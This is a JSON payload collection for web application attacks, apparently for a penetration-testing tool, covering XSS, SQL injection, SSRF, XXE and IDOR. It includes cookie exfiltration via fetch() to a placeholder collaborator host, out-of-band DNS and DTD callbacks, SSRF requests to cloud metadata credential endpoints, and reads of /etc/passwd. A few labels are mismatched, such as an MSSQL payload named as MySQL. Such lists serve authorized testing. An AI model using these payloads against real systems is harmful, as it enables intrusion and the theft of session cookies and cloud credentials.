{
  "payloads": [
    {
      "id": "xss-001",
      "category": "XSS",
      "tags": ["Reflected", "Basic"],
      "name": "Classic Alert",
      "payload": "<script>alert(1)</script>",
      "description": "Basic XSS test payload"
    },
    {
      "id": "xss-002",
      "category": "XSS",
      "tags": ["Reflected", "Filter Bypass"],
      "name": "IMG Onerror",
      "payload": "<img src=x onerror=alert(1)>",
      "description": "Image tag with onerror handler"
    },
    {
      "id": "xss-003",
      "category": "XSS",
      "tags": ["Reflected", "Filter Bypass"],
      "name": "SVG Onload",
      "payload": "<svg onload=alert(1)>",
      "description": "SVG tag with onload event"
    },
    {
      "id": "xss-004",
      "category": "XSS",
      "tags": ["Stored", "Filter Bypass"],
      "name": "Polyglot",
      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
      "description": "XSS polyglot that bypasses multiple filters"
    },
    {
      "id": "xss-005",
      "category": "XSS",
      "tags": ["Blind", "Out-of-Band"],
      "name": "Blind XSS - Fetch",
      "payload": "<script>fetch('https://YOUR-COLLABORATOR.com/?c='+document.cookie)</script>",
      "description": "Blind XSS using fetch for OOB data exfiltration"
    },
    {
      "id": "xss-006",
      "category": "XSS",
      "tags": ["DOM-Based", "Filter Bypass"],
      "name": "DOM XSS - Hash",
      "payload": "#<img src=x onerror=alert(document.domain)>",
      "description": "DOM-based XSS via URL fragment"
    },
    {
      "id": "xss-007",
      "category": "XSS",
      "tags": ["Reflected", "Angular"],
      "name": "AngularJS Template Injection",
      "payload": "{{constructor.constructor('alert(1)')()}}",
      "description": "AngularJS client-side template injection"
    },
    {
      "id": "xss-008",
      "category": "XSS",
      "tags": ["Filter Bypass", "Encoding"],
      "name": "HTML Entity Bypass",
      "payload": "<img src=x onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">",
      "description": "HTML entity encoded payload to bypass filters"
    },
    {
      "id": "sqli-001",
      "category": "SQLi",
      "tags": ["Error-Based", "Basic"],
      "name": "Classic OR 1=1",
      "payload": "' OR '1'='1",
      "description": "Basic boolean-based SQL injection"
    },
    {
      "id": "sqli-002",
      "category": "SQLi",
      "tags": ["Error-Based", "Basic"],
      "name": "UNION SELECT NULL",
      "payload": "' UNION SELECT NULL,NULL,NULL--",
      "description": "UNION-based injection to determine column count"
    },
    {
      "id": "sqli-003",
      "category": "SQLi",
      "tags": ["Blind", "Time-Based"],
      "name": "MySQL Time Delay",
      "payload": "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
      "description": "Time-based blind SQLi for MSSQL"
    },
    {
      "id": "sqli-004",
      "category": "SQLi",
      "tags": ["Blind", "Time-Based"],
      "name": "PostgreSQL Sleep",
      "payload": "'; SELECT pg_sleep(5)--",
      "description": "Time-based blind SQLi for PostgreSQL"
    },
    {
      "id": "sqli-005",
      "category": "SQLi",
      "tags": ["Error-Based", "MySQL"],
      "name": "MySQL Version",
      "payload": "' AND extractvalue(1,concat(0x7e,version()))--",
      "description": "MySQL error-based version disclosure"
    },
    {
      "id": "sqli-006",
      "category": "SQLi",
      "tags": ["Out-of-Band", "DNS"],
      "name": "MSSQL OOB DNS",
      "payload": "'; exec master..xp_dirtree '//YOUR-COLLABORATOR.com/a'--",
      "description": "MSSQL out-of-band DNS lookup for blind SQLi"
    },
    {
      "id": "sqli-007",
      "category": "SQLi",
      "tags": ["Boolean-Based", "Blind"],
      "name": "Boolean Blind",
      "payload": "' AND SUBSTRING(username,1,1)='a",
      "description": "Boolean-based blind injection for character extraction"
    },
    {
      "id": "ssrf-001",
      "category": "SSRF",
      "tags": ["Basic", "Internal"],
      "name": "Localhost Probe",
      "payload": "http://127.0.0.1/",
      "description": "Basic SSRF to probe localhost"
    },
    {
      "id": "ssrf-002",
      "category": "SSRF",
      "tags": ["Cloud", "AWS"],
      "name": "AWS Metadata IMDSv1",
      "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "description": "AWS EC2 Instance Metadata Service credential disclosure"
    },
    {
      "id": "ssrf-003",
      "category": "SSRF",
      "tags": ["Cloud", "GCP"],
      "name": "GCP Metadata",
      "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "description": "GCP metadata endpoint for token disclosure"
    },
    {
      "id": "ssrf-004",
      "category": "SSRF",
      "tags": ["Cloud", "Azure"],
      "name": "Azure IMDS",
      "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "description": "Azure Instance Metadata Service endpoint"
    },
    {
      "id": "ssrf-005",
      "category": "SSRF",
      "tags": ["Bypass", "Encoding"],
      "name": "Decimal IP Bypass",
      "payload": "http://2130706433/",
      "description": "127.0.0.1 in decimal notation to bypass naive filters"
    },
    {
      "id": "ssrf-006",
      "category": "SSRF",
      "tags": ["Bypass", "DNS Rebinding"],
      "name": "IPv6 Loopback",
      "payload": "http://[::1]/",
      "description": "IPv6 loopback address for SSRF filter bypass"
    },
    {
      "id": "ssrf-007",
      "category": "SSRF",
      "tags": ["Protocol", "File"],
      "name": "File Protocol LFI",
      "payload": "file:///etc/passwd",
      "description": "File protocol SSRF to read local files"
    },
    {
      "id": "xxe-001",
      "category": "XXE",
      "tags": ["Basic", "File Read"],
      "name": "Classic File Read",
      "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
      "description": "Basic XXE to read /etc/passwd"
    },
    {
      "id": "xxe-002",
      "category": "XXE",
      "tags": ["Blind", "Out-of-Band"],
      "name": "OOB XXE via DTD",
      "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://YOUR-COLLABORATOR.com/evil.dtd\">%remote;]><root/>",
      "description": "Blind XXE via external DTD for OOB data exfiltration"
    },
    {
      "id": "xxe-003",
      "category": "XXE",
      "tags": ["SSRF", "Internal"],
      "name": "XXE to SSRF",
      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
      "description": "XXE chained to SSRF against cloud metadata endpoints"
    },
    {
      "id": "xxe-004",
      "category": "XXE",
      "tags": ["Filter Bypass", "UTF-16"],
      "name": "UTF-16 Encoding Bypass",
      "payload": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
      "description": "UTF-16 encoded XXE to bypass content-type filters"
    },
    {
      "id": "idor-001",
      "category": "IDOR",
      "tags": ["Basic", "BOLA"],
      "name": "Numeric ID Increment",
      "payload": "/api/users/1337",
      "description": "Test sequential numeric IDs for IDOR/BOLA"
    },
    {
      "id": "idor-002",
      "category": "IDOR",
      "tags": ["UUID", "BOLA"],
      "name": "UUID Parameter Tamper",
      "payload": "/api/orders/00000000-0000-0000-0000-000000000001",
      "description": "Test UUID-based object references for IDOR"
    },
    {
      "id": "idor-003",
      "category": "IDOR",
      "tags": ["Mass Assignment", "JSON"],
      "name": "Mass Assignment Test",
      "payload": "{\"user_id\": 1337, \"role\": \"admin\", \"email\": \"test@test.com\"}",
      "description": "Mass assignment to escalate privileges"
    },
    {
      "id": "idor-004",
      "category": "IDOR",
      "tags": ["HTTP Method", "Bypass"],
      "name": "Method Override IDOR",
      "payload": "X-HTTP-Method-Override: PUT",
      "description": "HTTP method override header for bypassing method-based ACL"
    }
  ]
}
